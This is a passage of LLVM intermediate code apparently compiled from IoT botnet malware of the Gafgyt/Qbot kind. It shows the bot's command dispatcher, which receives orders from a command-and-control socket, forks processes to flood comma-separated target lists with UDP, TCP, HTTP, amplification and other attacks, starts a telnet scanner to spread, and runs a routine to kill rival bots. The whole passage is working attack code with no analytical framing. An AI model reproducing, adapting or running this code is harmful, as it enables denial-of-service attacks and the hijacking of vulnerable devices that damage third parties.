  store i32 0, i32* @scanPid, align 4
  br label %28

; <label>:28:                                     ; preds = %16, %24
  %29 = load i8*, i8** %17, align 8
  %30 = tail call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.523, i64 0, i64 0)) #15
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %44

; <label>:32:                                     ; preds = %28
  %33 = load i32, i32* @scanPid, align 4
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %.loopexit

; <label>:35:                                     ; preds = %32
  %36 = tail call i32 @fork() #3
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %39, label %38

; <label>:38:                                     ; preds = %35
  store i32 %36, i32* @scanPid, align 4
  br label %.loopexit

; <label>:39:                                     ; preds = %35
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %42 = tail call i8* @inet_ntoa(i32 %41) #3
  %43 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %40, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.524, i64 0, i64 0), i8* %42)
  tail call void @TelnetScanner(i32 10, i32 1000)
  unreachable

; <label>:44:                                     ; preds = %28, %13
  %45 = load i8*, i8** %1, align 8
  %46 = tail call i32 @strcmp(i8* %45, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.525, i64 0, i64 0)) #15
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %48, label %56

; <label>:48:                                     ; preds = %44
  %49 = tail call i32 @listFork()
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %54 = tail call i8* @inet_ntoa(i32 %53) #3
  %55 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.526, i64 0, i64 0), i8* %54)
  tail call void @botkiller()
  unreachable

; <label>:56:                                     ; preds = %48, %44
  %57 = load i8*, i8** %1, align 8
  %58 = tail call i32 @strcmp(i8* %57, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.527, i64 0, i64 0)) #15
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %.loopexit, label %60

; <label>:60:                                     ; preds = %56
  %61 = tail call i32 @strcmp(i8* %57, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.528, i64 0, i64 0)) #15
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %218

; <label>:63:                                     ; preds = %60
  %64 = getelementptr inbounds i8*, i8** %1, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = tail call i32 @strcmp(i8* %65, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i64 0, i64 0)) #15
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %68, label %86

; <label>:68:                                     ; preds = %63
  %69 = icmp eq i32 %0, 5
  br i1 %69, label %70, label %.loopexit

; <label>:70:                                     ; preds = %68
  %71 = getelementptr inbounds i8*, i8** %1, i64 2
  %72 = bitcast i8** %71 to i64*
  %73 = load i64, i64* %72, align 8
  %74 = getelementptr inbounds i8*, i8** %1, i64 3
  %75 = bitcast i8** %74 to i64*
  %76 = load i64, i64* %75, align 8
  %77 = getelementptr inbounds i8*, i8** %1, i64 4
  %78 = bitcast i8** %77 to i64*
  %79 = load i64, i64* %78, align 8
  %sext = shl i64 %73, 32
  %80 = ashr exact i64 %sext, 32
  %81 = inttoptr i64 %80 to i8*
  %sext210 = shl i64 %76, 32
  %82 = ashr exact i64 %sext210, 32
  %83 = inttoptr i64 %82 to i8*
  %sext211 = shl i64 %79, 32
  %84 = ashr exact i64 %sext211, 32
  %85 = inttoptr i64 %84 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i64 0, i64 0), i8* %81, i8* %83, i8* %85)
  br label %86

; <label>:86:                                     ; preds = %63, %70
  %87 = load i8*, i8** %64, align 8
  %88 = tail call i32 @strcmp(i8* %87, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i64 0, i64 0)) #15
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %108

; <label>:90:                                     ; preds = %86
  %91 = icmp eq i32 %0, 5
  br i1 %91, label %92, label %.loopexit

; <label>:92:                                     ; preds = %90
  %93 = getelementptr inbounds i8*, i8** %1, i64 2
  %94 = bitcast i8** %93 to i64*
  %95 = load i64, i64* %94, align 8
  %96 = getelementptr inbounds i8*, i8** %1, i64 3
  %97 = bitcast i8** %96 to i64*
  %98 = load i64, i64* %97, align 8
  %99 = getelementptr inbounds i8*, i8** %1, i64 4
  %100 = bitcast i8** %99 to i64*
  %101 = load i64, i64* %100, align 8
  %sext212 = shl i64 %95, 32
  %102 = ashr exact i64 %sext212, 32
  %103 = inttoptr i64 %102 to i8*
  %sext213 = shl i64 %98, 32
  %104 = ashr exact i64 %sext213, 32
  %105 = inttoptr i64 %104 to i8*
  %sext214 = shl i64 %101, 32
  %106 = ashr exact i64 %sext214, 32
  %107 = inttoptr i64 %106 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i64 0, i64 0), i8* %103, i8* %105, i8* %107)
  br label %108

; <label>:108:                                    ; preds = %86, %92
  %109 = load i8*, i8** %64, align 8
  %110 = tail call i32 @strcmp(i8* %109, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i64 0, i64 0)) #15
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %130

; <label>:112:                                    ; preds = %108
  %113 = icmp eq i32 %0, 5
  br i1 %113, label %114, label %.loopexit

; <label>:114:                                    ; preds = %112
  %115 = getelementptr inbounds i8*, i8** %1, i64 2
  %116 = bitcast i8** %115 to i64*
  %117 = load i64, i64* %116, align 8
  %118 = getelementptr inbounds i8*, i8** %1, i64 3
  %119 = bitcast i8** %118 to i64*
  %120 = load i64, i64* %119, align 8
  %121 = getelementptr inbounds i8*, i8** %1, i64 4
  %122 = bitcast i8** %121 to i64*
  %123 = load i64, i64* %122, align 8
  %sext215 = shl i64 %117, 32
  %124 = ashr exact i64 %sext215, 32
  %125 = inttoptr i64 %124 to i8*
  %sext216 = shl i64 %120, 32
  %126 = ashr exact i64 %sext216, 32
  %127 = inttoptr i64 %126 to i8*
  %sext217 = shl i64 %123, 32
  %128 = ashr exact i64 %sext217, 32
  %129 = inttoptr i64 %128 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i64 0, i64 0), i8* %125, i8* %127, i8* %129)
  br label %130

; <label>:130:                                    ; preds = %108, %114
  %131 = load i8*, i8** %64, align 8
  %132 = tail call i32 @strcmp(i8* %131, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i64 0, i64 0)) #15
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %152

; <label>:134:                                    ; preds = %130
  %135 = icmp eq i32 %0, 5
  br i1 %135, label %136, label %.loopexit

; <label>:136:                                    ; preds = %134
  %137 = getelementptr inbounds i8*, i8** %1, i64 2
  %138 = bitcast i8** %137 to i64*
  %139 = load i64, i64* %138, align 8
  %140 = getelementptr inbounds i8*, i8** %1, i64 3
  %141 = bitcast i8** %140 to i64*
  %142 = load i64, i64* %141, align 8
  %143 = getelementptr inbounds i8*, i8** %1, i64 4
  %144 = bitcast i8** %143 to i64*
  %145 = load i64, i64* %144, align 8
  %sext218 = shl i64 %139, 32
  %146 = ashr exact i64 %sext218, 32
  %147 = inttoptr i64 %146 to i8*
  %sext219 = shl i64 %142, 32
  %148 = ashr exact i64 %sext219, 32
  %149 = inttoptr i64 %148 to i8*
  %sext220 = shl i64 %145, 32
  %150 = ashr exact i64 %sext220, 32
  %151 = inttoptr i64 %150 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i64 0, i64 0), i8* %147, i8* %149, i8* %151)
  br label %152

; <label>:152:                                    ; preds = %130, %136
  %153 = load i8*, i8** %64, align 8
  %154 = tail call i32 @strcmp(i8* %153, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i64 0, i64 0)) #15
  %155 = icmp eq i32 %154, 0
  br i1 %155, label %156, label %174

; <label>:156:                                    ; preds = %152
  %157 = icmp eq i32 %0, 5
  br i1 %157, label %158, label %.loopexit

; <label>:158:                                    ; preds = %156
  %159 = getelementptr inbounds i8*, i8** %1, i64 2
  %160 = bitcast i8** %159 to i64*
  %161 = load i64, i64* %160, align 8
  %162 = getelementptr inbounds i8*, i8** %1, i64 3
  %163 = bitcast i8** %162 to i64*
  %164 = load i64, i64* %163, align 8
  %165 = getelementptr inbounds i8*, i8** %1, i64 4
  %166 = bitcast i8** %165 to i64*
  %167 = load i64, i64* %166, align 8
  %sext221 = shl i64 %161, 32
  %168 = ashr exact i64 %sext221, 32
  %169 = inttoptr i64 %168 to i8*
  %sext222 = shl i64 %164, 32
  %170 = ashr exact i64 %sext222, 32
  %171 = inttoptr i64 %170 to i8*
  %sext223 = shl i64 %167, 32
  %172 = ashr exact i64 %sext223, 32
  %173 = inttoptr i64 %172 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i64 0, i64 0), i8* %169, i8* %171, i8* %173)
  br label %174

; <label>:174:                                    ; preds = %152, %158
  %175 = load i8*, i8** %64, align 8
  %176 = tail call i32 @strcmp(i8* %175, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i64 0, i64 0)) #15
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %196

; <label>:178:                                    ; preds = %174
  %179 = icmp eq i32 %0, 5
  br i1 %179, label %180, label %.loopexit

; <label>:180:                                    ; preds = %178
  %181 = getelementptr inbounds i8*, i8** %1, i64 2
  %182 = bitcast i8** %181 to i64*
  %183 = load i64, i64* %182, align 8
  %184 = getelementptr inbounds i8*, i8** %1, i64 3
  %185 = bitcast i8** %184 to i64*
  %186 = load i64, i64* %185, align 8
  %187 = getelementptr inbounds i8*, i8** %1, i64 4
  %188 = bitcast i8** %187 to i64*
  %189 = load i64, i64* %188, align 8
  %sext224 = shl i64 %183, 32
  %190 = ashr exact i64 %sext224, 32
  %191 = inttoptr i64 %190 to i8*
  %sext225 = shl i64 %186, 32
  %192 = ashr exact i64 %sext225, 32
  %193 = inttoptr i64 %192 to i8*
  %sext226 = shl i64 %189, 32
  %194 = ashr exact i64 %sext226, 32
  %195 = inttoptr i64 %194 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i64 0, i64 0), i8* %191, i8* %193, i8* %195)
  br label %196

; <label>:196:                                    ; preds = %174, %180
  %197 = load i8*, i8** %64, align 8
  %198 = tail call i32 @strcmp(i8* %197, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i64 0, i64 0)) #15
  %199 = icmp eq i32 %198, 0
  br i1 %199, label %200, label %218

; <label>:200:                                    ; preds = %196
  %201 = icmp eq i32 %0, 5
  br i1 %201, label %202, label %.loopexit

; <label>:202:                                    ; preds = %200
  %203 = getelementptr inbounds i8*, i8** %1, i64 2
  %204 = bitcast i8** %203 to i64*
  %205 = load i64, i64* %204, align 8
  %206 = getelementptr inbounds i8*, i8** %1, i64 3
  %207 = bitcast i8** %206 to i64*
  %208 = load i64, i64* %207, align 8
  %209 = getelementptr inbounds i8*, i8** %1, i64 4
  %210 = bitcast i8** %209 to i64*
  %211 = load i64, i64* %210, align 8
  %sext227 = shl i64 %205, 32
  %212 = ashr exact i64 %sext227, 32
  %213 = inttoptr i64 %212 to i8*
  %sext228 = shl i64 %208, 32
  %214 = ashr exact i64 %sext228, 32
  %215 = inttoptr i64 %214 to i8*
  %sext229 = shl i64 %211, 32
  %216 = ashr exact i64 %sext229, 32
  %217 = inttoptr i64 %216 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i64 0, i64 0), i8* %213, i8* %215, i8* %217)
  br label %218

; <label>:218:                                    ; preds = %196, %60, %202
  %219 = load i8*, i8** %1, align 8
  %220 = tail call i32 @strcmp(i8* %219, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.529, i64 0, i64 0)) #15
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %294

; <label>:222:                                    ; preds = %218
  %223 = icmp slt i32 %0, 6
  br i1 %223, label %.loopexit, label %224

; <label>:224:                                    ; preds = %222
  %225 = getelementptr inbounds i8*, i8** %1, i64 3
  %226 = load i8*, i8** %225, align 8
  %227 = tail call i32 @atoi(i8* %226) #15
  %228 = icmp eq i32 %227, -1
  br i1 %228, label %.loopexit, label %229

; <label>:229:                                    ; preds = %224
  %230 = getelementptr inbounds i8*, i8** %1, i64 2
  %231 = load i8*, i8** %230, align 8
  %232 = tail call i32 @atoi(i8* %231) #15
  %233 = icmp eq i32 %232, -1
  br i1 %233, label %.loopexit, label %234

; <label>:234:                                    ; preds = %229
  %235 = getelementptr inbounds i8*, i8** %1, i64 4
  %236 = load i8*, i8** %235, align 8
  %237 = tail call i32 @atoi(i8* %236) #15
  %238 = icmp eq i32 %237, -1
  br i1 %238, label %.loopexit, label %239

; <label>:239:                                    ; preds = %234
  %240 = getelementptr inbounds i8*, i8** %1, i64 5
  %241 = load i8*, i8** %240, align 8
  %242 = tail call i32 @atoi(i8* %241) #15
  %243 = icmp eq i32 %242, -1
  %244 = icmp sgt i32 %242, 65500
  %245 = or i1 %244, %243
  %246 = icmp sgt i32 %237, 32
  %or.cond235 = or i1 %246, %245
  br i1 %or.cond235, label %.loopexit, label %247

; <label>:247:                                    ; preds = %239
  %248 = icmp eq i32 %0, 7
  br i1 %248, label %249, label %254

; <label>:249:                                    ; preds = %247
  %250 = getelementptr inbounds i8*, i8** %1, i64 6
  %251 = load i8*, i8** %250, align 8
  %252 = tail call i32 @atoi(i8* %251) #15
  %253 = icmp slt i32 %252, 1
  br i1 %253, label %.loopexit, label %254

; <label>:254:                                    ; preds = %249, %247
  %255 = getelementptr inbounds i8*, i8** %1, i64 1
  %256 = load i8*, i8** %255, align 8
  %257 = load i8*, i8** %230, align 8
  %258 = tail call i32 @atoi(i8* %257) #15
  %259 = load i8*, i8** %225, align 8
  %260 = tail call i32 @atoi(i8* %259) #15
  %261 = load i8*, i8** %235, align 8
  %262 = tail call i32 @atoi(i8* %261) #15
  %263 = load i8*, i8** %240, align 8
  %264 = tail call i32 @atoi(i8* %263) #15
  %265 = icmp sgt i32 %0, 6
  br i1 %265, label %266, label %.thread241

; <label>:266:                                    ; preds = %254
  %267 = getelementptr inbounds i8*, i8** %1, i64 6
  %268 = load i8*, i8** %267, align 8
  %269 = tail call i32 @atoi(i8* %268) #15
  %270 = icmp eq i32 %0, 7
  br i1 %270, label %.thread241, label %271

; <label>:271:                                    ; preds = %266
  %272 = getelementptr inbounds i8*, i8** %1, i64 7
  %273 = load i8*, i8** %272, align 8
  %274 = tail call i32 @atoi(i8* %273) #15
  %275 = icmp sgt i32 %0, 8
  br i1 %275, label %276, label %.thread241

; <label>:276:                                    ; preds = %271
  %277 = getelementptr inbounds i8*, i8** %1, i64 8
  %278 = load i8*, i8** %277, align 8
  %279 = tail call i32 @atoi(i8* %278) #15
  br label %.thread241

.thread241:                                       ; preds = %266, %254, %271, %276
  %280 = phi i32 [ %274, %276 ], [ %274, %271 ], [ 1000000, %266 ], [ 1000000, %254 ]
  %281 = phi i32 [ %269, %276 ], [ %269, %271 ], [ %269, %266 ], [ 1000, %254 ]
  %282 = phi i32 [ %279, %276 ], [ 0, %271 ], [ 0, %266 ], [ 0, %254 ]
  %strchr = tail call i8* @strchr(i8* %256, i32 44)
  %283 = icmp eq i8* %strchr, null
  br i1 %283, label %290, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.thread241
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %286
  %.sink = phi i8* [ null, %286 ], [ %256, %.preheader.preheader ]
  %284 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %285 = icmp eq i8* %284, null
  br i1 %285, label %.loopexit.loopexit, label %286

; <label>:286:                                    ; preds = %.preheader
  %287 = tail call i32 @listFork()
  %288 = icmp eq i32 %287, 0
  br i1 %288, label %289, label %.preheader

; <label>:289:                                    ; preds = %286
  tail call void @sendUDP(i8* nonnull %284, i32 %258, i32 %260, i32 %262, i32 %264, i32 %281, i32 %280, i32 %282)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:290:                                    ; preds = %.thread241
  %291 = tail call i32 @listFork()
  %292 = icmp eq i32 %291, 0
  br i1 %292, label %293, label %.loopexit

; <label>:293:                                    ; preds = %290
  tail call void @sendUDP(i8* %256, i32 %258, i32 %260, i32 %262, i32 %264, i32 %281, i32 %280, i32 %282)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:294:                                    ; preds = %218
  %295 = tail call i32 @strcmp(i8* %219, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.530, i64 0, i64 0)) #15
  %296 = icmp eq i32 %295, 0
  br i1 %296, label %297, label %.loopexit251

; <label>:297:                                    ; preds = %294
  %298 = icmp slt i32 %0, 6
  br i1 %298, label %.loopexit, label %299

; <label>:299:                                    ; preds = %297
  %300 = getelementptr inbounds i8*, i8** %1, i64 3
  %301 = load i8*, i8** %300, align 8
  %302 = tail call i32 @atoi(i8* %301) #15
  %303 = icmp eq i32 %302, -1
  br i1 %303, label %.loopexit, label %304

; <label>:304:                                    ; preds = %299
  %305 = getelementptr inbounds i8*, i8** %1, i64 2
  %306 = load i8*, i8** %305, align 8
  %307 = tail call i32 @atoi(i8* %306) #15
  %308 = icmp eq i32 %307, -1
  br i1 %308, label %.loopexit, label %309

; <label>:309:                                    ; preds = %304
  %310 = getelementptr inbounds i8*, i8** %1, i64 4
  %311 = load i8*, i8** %310, align 8
  %312 = tail call i32 @atoi(i8* %311) #15
  %313 = icmp eq i32 %312, -1
  %314 = icmp sgt i32 %312, 32
  %or.cond236 = or i1 %313, %314
  br i1 %or.cond236, label %.loopexit, label %315

; <label>:315:                                    ; preds = %309
  %316 = icmp sgt i32 %0, 6
  br i1 %316, label %317, label %.thread242

; <label>:317:                                    ; preds = %315
  %318 = getelementptr inbounds i8*, i8** %1, i64 6
  %319 = load i8*, i8** %318, align 8
  %320 = tail call i32 @atoi(i8* %319) #15
  %321 = icmp slt i32 %320, 0
  br i1 %321, label %.loopexit, label %322

; <label>:322:                                    ; preds = %317
  %323 = icmp eq i32 %0, 8
  br i1 %323, label %324, label %.thread242

; <label>:324:                                    ; preds = %322
  %325 = getelementptr inbounds i8*, i8** %1, i64 7
  %326 = load i8*, i8** %325, align 8
  %327 = tail call i32 @atoi(i8* %326) #15
  %328 = icmp slt i32 %327, 1
  br i1 %328, label %.loopexit, label %.thread242

.thread242:                                       ; preds = %315, %324, %322
  %329 = phi i1 [ true, %324 ], [ false, %322 ], [ false, %315 ]
  %330 = getelementptr inbounds i8*, i8** %1, i64 1
  %331 = load i8*, i8** %330, align 8
  %332 = load i8*, i8** %305, align 8
  %333 = tail call i32 @atoi(i8* %332) #15
  %334 = load i8*, i8** %300, align 8
  %335 = tail call i32 @atoi(i8* %334) #15
  %336 = load i8*, i8** %310, align 8
  %337 = tail call i32 @atoi(i8* %336) #15
  %338 = getelementptr inbounds i8*, i8** %1, i64 5
  %339 = load i8*, i8** %338, align 8
  br i1 %329, label %340, label %344

; <label>:340:                                    ; preds = %.thread242
  %341 = getelementptr inbounds i8*, i8** %1, i64 7
  %342 = load i8*, i8** %341, align 8
  %343 = tail call i32 @atoi(i8* %342) #15
  br label %344

; <label>:344:                                    ; preds = %.thread242, %340
  %345 = phi i32 [ %343, %340 ], [ 10, %.thread242 ]
  br i1 %316, label %346, label %350

; <label>:346:                                    ; preds = %344
  %347 = getelementptr inbounds i8*, i8** %1, i64 6
  %348 = load i8*, i8** %347, align 8
  %349 = tail call i32 @atoi(i8* %348) #15
  br label %350

; <label>:350:                                    ; preds = %344, %346
  %351 = phi i32 [ %349, %346 ], [ 0, %344 ]
  %strchr230 = tail call i8* @strchr(i8* %331, i32 44)
  %352 = icmp eq i8* %strchr230, null
  br i1 %352, label %359, label %.preheader250.preheader

.preheader250.preheader:                          ; preds = %350
  br label %.preheader250

.preheader250:                                    ; preds = %.preheader250.preheader, %355
  %.sink237 = phi i8* [ null, %355 ], [ %331, %.preheader250.preheader ]
  %353 = tail call i8* @strtok(i8* %.sink237, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %354 = icmp eq i8* %353, null
  br i1 %354, label %.loopexit251.loopexit, label %355

; <label>:355:                                    ; preds = %.preheader250
  %356 = tail call i32 @listFork()
  %357 = icmp eq i32 %356, 0
  br i1 %357, label %358, label %.preheader250

; <label>:358:                                    ; preds = %355
  tail call void @sendTCP(i8* nonnull %353, i32 %333, i32 %335, i32 %337, i8* %339, i32 %351, i32 %345)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:359:                                    ; preds = %350
  %360 = tail call i32 @listFork()
  %361 = icmp eq i32 %360, 0
  br i1 %361, label %362, label %.loopexit251

; <label>:362:                                    ; preds = %359
  tail call void @sendTCP(i8* %331, i32 %333, i32 %335, i32 %337, i8* %339, i32 %351, i32 %345)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit251.loopexit:                            ; preds = %.preheader250
  br label %.loopexit251

.loopexit251:                                     ; preds = %.loopexit251.loopexit, %359, %294
  %363 = load i8*, i8** %1, align 8
  %364 = tail call i32 @strcmp(i8* %363, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.531, i64 0, i64 0)) #15
  %365 = icmp eq i32 %364, 0
  br i1 %365, label %366, label %.loopexit249

; <label>:366:                                    ; preds = %.loopexit251
  %367 = icmp slt i32 %0, 6
  br i1 %367, label %.loopexit, label %368

; <label>:368:                                    ; preds = %366
  %369 = getelementptr inbounds i8*, i8** %1, i64 1
  %370 = load i8*, i8** %369, align 8
  %strchr231 = tail call i8* @strchr(i8* %370, i32 44)
  %371 = icmp eq i8* %strchr231, null
  br i1 %371, label %393, label %.preheader248.preheader

.preheader248.preheader:                          ; preds = %368
  br label %.preheader248

.preheader248:                                    ; preds = %.preheader248.preheader, %374
  %.sink238 = phi i8* [ null, %374 ], [ %370, %.preheader248.preheader ]
  %372 = tail call i8* @strtok(i8* %.sink238, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %373 = icmp eq i8* %372, null
  br i1 %373, label %.loopexit249.loopexit, label %374

; <label>:374:                                    ; preds = %.preheader248
  %375 = tail call i32 @listFork()
  %376 = icmp eq i32 %375, 0
  br i1 %376, label %377, label %.preheader248

; <label>:377:                                    ; preds = %374
  %378 = load i8*, i8** %369, align 8
  %379 = getelementptr inbounds i8*, i8** %1, i64 2
  %380 = load i8*, i8** %379, align 8
  %381 = getelementptr inbounds i8*, i8** %1, i64 3
  %382 = load i8*, i8** %381, align 8
  %383 = tail call i32 @atoi(i8* %382) #15
  %384 = trunc i32 %383 to i16
  %385 = getelementptr inbounds i8*, i8** %1, i64 4
  %386 = load i8*, i8** %385, align 8
  %387 = getelementptr inbounds i8*, i8** %1, i64 5
  %388 = load i8*, i8** %387, align 8
  %389 = tail call i32 @atoi(i8* %388) #15
  %390 = getelementptr inbounds i8*, i8** %1, i64 6
  %391 = load i8*, i8** %390, align 8
  %392 = tail call i32 @atoi(i8* %391) #15
  tail call void @sendHTTP(i8* %378, i8* %380, i16 zeroext %384, i8* %386, i32 %389, i32 %392)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:393:                                    ; preds = %368
  %394 = tail call i32 @listFork()
  %395 = icmp eq i32 %394, 0
  br i1 %395, label %396, label %.loopexit

; <label>:396:                                    ; preds = %393
  %397 = load i8*, i8** %369, align 8
  %398 = getelementptr inbounds i8*, i8** %1, i64 2
  %399 = load i8*, i8** %398, align 8
  %400 = getelementptr inbounds i8*, i8** %1, i64 3
  %401 = load i8*, i8** %400, align 8
  %402 = tail call i32 @atoi(i8* %401) #15
  %403 = trunc i32 %402 to i16
  %404 = getelementptr inbounds i8*, i8** %1, i64 4
  %405 = load i8*, i8** %404, align 8
  %406 = getelementptr inbounds i8*, i8** %1, i64 5
  %407 = load i8*, i8** %406, align 8
  %408 = tail call i32 @atoi(i8* %407) #15
  %409 = getelementptr inbounds i8*, i8** %1, i64 6
  %410 = load i8*, i8** %409, align 8
  %411 = tail call i32 @atoi(i8* %410) #15
  tail call void @sendHTTP(i8* %397, i8* %399, i16 zeroext %403, i8* %405, i32 %408, i32 %411)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit249.loopexit:                            ; preds = %.preheader248
  br label %.loopexit249

.loopexit249:                                     ; preds = %.loopexit249.loopexit, %.loopexit251
  %412 = load i8*, i8** %1, align 8
  %413 = tail call i32 @strcmp(i8* %412, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.532, i64 0, i64 0)) #15
  %414 = icmp eq i32 %413, 0
  br i1 %414, label %415, label %.loopexit247

; <label>:415:                                    ; preds = %.loopexit249
  %416 = icmp slt i32 %0, 4
  br i1 %416, label %.loopexit, label %417

; <label>:417:                                    ; preds = %415
  %418 = getelementptr inbounds i8*, i8** %1, i64 2
  %419 = load i8*, i8** %418, align 8
  %420 = tail call i32 @atoi(i8* %419) #15
  %421 = icmp slt i32 %420, 1
  br i1 %421, label %.loopexit, label %422

; <label>:422:                                    ; preds = %417
  %423 = getelementptr inbounds i8*, i8** %1, i64 3
  %424 = load i8*, i8** %423, align 8
  %425 = tail call i32 @atoi(i8* %424) #15
  %426 = icmp slt i32 %425, 1
  br i1 %426, label %.loopexit, label %427

; <label>:427:                                    ; preds = %422
  %428 = getelementptr inbounds i8*, i8** %1, i64 1
  %429 = load i8*, i8** %428, align 8
  %strchr232 = tail call i8* @strchr(i8* %429, i32 44)
  %430 = icmp eq i8* %strchr232, null
  br i1 %430, label %439, label %.preheader246.preheader

.preheader246.preheader:                          ; preds = %427
  br label %.preheader246

.preheader246:                                    ; preds = %.preheader246.preheader, %433
  %.sink239 = phi i8* [ null, %433 ], [ %429, %.preheader246.preheader ]
  %431 = tail call i8* @strtok(i8* %.sink239, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %432 = icmp eq i8* %431, null
  br i1 %432, label %.loopexit247.loopexit, label %433

; <label>:433:                                    ; preds = %.preheader246
  %434 = tail call i32 @listFork()
  %435 = icmp eq i32 %434, 0
  br i1 %435, label %436, label %.preheader246

; <label>:436:                                    ; preds = %433
  tail call void @sendCNC(i8* nonnull %431, i32 %420, i32 %425)
  %437 = load i32, i32* @mainCommSock, align 4
  %438 = tail call i32 @close(i32 %437) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:439:                                    ; preds = %427
  %440 = tail call i32 @listFork()
  %441 = icmp eq i32 %440, 0
  br i1 %441, label %442, label %.loopexit

; <label>:442:                                    ; preds = %439
  tail call void @sendCNC(i8* %429, i32 %420, i32 %425)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit247.loopexit:                            ; preds = %.preheader246
  br label %.loopexit247

.loopexit247:                                     ; preds = %.loopexit247.loopexit, %.loopexit249
  %443 = load i8*, i8** %1, align 8
  %444 = tail call i32 @strcmp(i8* %443, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.533, i64 0, i64 0)) #15
  %445 = icmp eq i32 %444, 0
  br i1 %445, label %446, label %.loopexit245

; <label>:446:                                    ; preds = %.loopexit247
  %447 = icmp slt i32 %0, 4
  br i1 %447, label %.loopexit, label %448

; <label>:448:                                    ; preds = %446
  %449 = getelementptr inbounds i8*, i8** %1, i64 2
  %450 = load i8*, i8** %449, align 8
  %451 = tail call i32 @atoi(i8* %450) #15
  %452 = icmp slt i32 %451, 1
  br i1 %452, label %.loopexit, label %453

; <label>:453:                                    ; preds = %448
  %454 = getelementptr inbounds i8*, i8** %1, i64 3
  %455 = load i8*, i8** %454, align 8
  %456 = tail call i32 @atoi(i8* %455) #15
  %457 = icmp slt i32 %456, 1
  br i1 %457, label %.loopexit, label %458

; <label>:458:                                    ; preds = %453
  %459 = getelementptr inbounds i8*, i8** %1, i64 1
  %460 = load i8*, i8** %459, align 8
  %strchr233 = tail call i8* @strchr(i8* %460, i32 44)
  %461 = icmp eq i8* %strchr233, null
  br i1 %461, label %468, label %.preheader244.preheader

.preheader244.preheader:                          ; preds = %458
  br label %.preheader244

.preheader244:                                    ; preds = %.preheader244.preheader, %464
  %.sink240 = phi i8* [ null, %464 ], [ %460, %.preheader244.preheader ]
  %462 = tail call i8* @strtok(i8* %.sink240, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %463 = icmp eq i8* %462, null
  br i1 %463, label %.loopexit245.loopexit, label %464

; <label>:464:                                    ; preds = %.preheader244
  %465 = tail call i32 @listFork()
  %466 = icmp eq i32 %465, 0
  br i1 %466, label %467, label %.preheader244

; <label>:467:                                    ; preds = %464
  tail call void @sendSTD(i8* nonnull %462, i32 %451, i32 %456)
  unreachable

; <label>:468:                                    ; preds = %458
  %469 = tail call i32 @listFork()
  %470 = icmp eq i32 %469, 0
  br i1 %470, label %471, label %.loopexit

; <label>:471:                                    ; preds = %468
